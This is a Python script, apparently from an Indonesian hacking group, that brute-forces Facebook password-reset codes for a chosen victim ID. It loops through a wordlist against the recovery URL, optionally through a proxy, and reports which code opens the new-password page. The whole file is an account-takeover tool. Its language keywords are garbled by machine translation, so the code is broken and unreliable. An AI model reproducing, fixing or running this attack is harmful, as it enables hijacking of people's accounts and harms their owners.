import  urllib2 , sys , re
impor  os
impor  ssl
 waktu impor

def  cls ():
    linux  =  'bersihkan'
    windows  =  'cls'
    os . sistem ([ linux , windows ] [ os . name  ==  'nt' ])

cls ()

os . sistem ([ '' , 'color D' ] [ os . name  ==  'nt' ])

cetak  '' '
                SELAMAT DATANG
                     DI
                TIM ACEH CYBER
           KODE: OLEH R15ky Ch4nn3L
     PEMULIHAN FACEBOOK PASSWORD ATTACKER  
 _____ _ _
| ___ | _ _ ___ ___ | | __ ___ ___ | | __
| | _ / _` | / __ / _ \ '_ \ / _ \ / _ \ | | / /
| _ | (_ | | (_ | __ / | _) | (_) | (_) | <
| _ | \ __, _ | \ ___ \ ___ | _.__ / \ ___ / \ ___ / | _ | \ _ \ '' '
jika  len ( sys . argv ) ! =  3 :
    cetak  " \ n \ n [#] Penulisan: python2 fb.py [TagetID] [listkode.txt]"
    sys . keluar ()

target  =  sys . argv [ 1 ]
daftar kata  =  sys . argv [ 2 ]


sementara  Benar :
    cetak  "" "
    ============ Menu ==============
    1- Reset Kata Sandi Korban Dengan Proxy
    2- Dengan Proxy saja
    
    "" "

    choice = raw_input ( "Masuka Pilihan Mu:" )

    jika  pilihan == "1" :
        coba :
            word  =  open ( daftar kata , 'r' ). garis baca ()
            print  "[+] Kode Nya Tersimpan \! / \ n [+] Kode:" , len ( kata )
        kecuali ( "IOError" ):
            print  "[-] Hanya dalam Format .txt Ngentod: v"
            sys . keluar ( 1 );

        untuk  w  dalam  kata :
            w  =  w . rstrip ()
            coba :
                target  =  'https://m.facebook.com/recover/password?u=' + target + '& n =' + w
                get  =  urllib2 . urlopen ( target ). baca ()
    
            kecuali  IOError :
                cetak  "Gabisa Dimuat Halaman Nya :("
    
            search  =  re . cari ( 'password_new' , dapatkan )
            jika  mencari :
                print  "[+] Kode Yang Ini" + w + "Bener anda beuntung ^ ___ ^"
            lain :
                print  "[+] Kode Yangini" + w + "Salah nyan> :("
    lain :

        cetak  "" "
        Selamat Datang Di Tools Saya Masukan Proxy: Port Anda Beb: *
        Penggunaan: [ip: port]
        "" "
        ip_proxy = raw_input ( "Masukan Proxy Mu:" )
        cetak  "[##] Proxy Terpasang:" + ip_proxy
        proxy  =  urllib2 . ProxyHandler ({ 'http' : ip_proxy })
        pembuka  =  urllib2 . build_opener ( proxy )
        urllib2 . install_opener ( pembuka )
        
        #ip = urllib2.urlopen ('http://checkip.dyndns.org') .read ()
        #theIP = re.findall (r "\ d {1,3} \. \ d {1,3} \. \ d {1,3}. \ d {1,3}", ip)
        #print theIP
        #datum = response.read ()
        # response.close ()
        #print datum
        coba :
            word  =  open ( daftar kata , 'r' ). garis baca ()
            print  "[+] Kode Reset Tersimpan \! / \ n [+] Kodd:" , len ( word )
        kecuali ( "IOError" ):
            cetak  "[-] Yang Ini Gabisa Di Pake Anjirr !!"
            sys . keluar ( 1 );

        untuk  w  dalam  kata :
            w  =  w . rstrip ()
            coba :
                target  =  'https://m.facebook.com/recover/password?u=' + target + '& n =' + w
                get  =  urllib2 . urlopen ( target ). baca ()
                
            kecuali  IOError :
                cetak  "Yahh halaman ny gabisa dimuat :("
        
            search  =  re . cari ( 'password_new' , dapatkan )
            jika  mencari :
                cetak  "[+] Kodenya yang ini" + w + "Bener Sayang: *"
            lain :
                print  "[+] Kode Yang Ini" + w + "Gabisa Dipakai Tod: v"
